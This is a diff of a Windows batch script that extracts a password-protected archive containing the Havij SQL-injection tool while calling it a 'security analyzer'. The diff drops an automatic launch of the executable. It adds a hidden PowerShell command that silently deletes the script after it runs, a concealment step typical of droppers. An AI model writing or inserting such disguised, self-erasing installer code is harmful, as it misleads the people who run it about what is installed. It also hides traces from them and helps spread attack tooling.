@@ -151,10 +151,6 @@ start "" /wait "!winrar_exe!" x -ibck -p"%password%" "!havij_zip!" "!folder!\"
 
 if %errorlevel% equ 0 (
     echo [SUCCESS] Package decrypted successfully
-    :: === NEW CODE STARTS HERE ===
-    echo [STEP] Launching security analyzer...
-    start "" /D "!folder!" "Havij 1.12 Free.exe"
-    :: === NEW CODE ENDS HERE ===
 ) else if %errorlevel% equ 1 (
     echo [ALERT] Invalid security credentials
 ) else if %errorlevel% equ 2 (
@@ -174,4 +170,9 @@ echo.
 
 :: Open folder AFTER extraction completes
 start explorer "!folder!"
+
+:: Start silent deletion in background before pause
+start "" powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 5; Remove-Item -LiteralPath '%~f0' -Force"
+
+:: Wait for user input
 pause
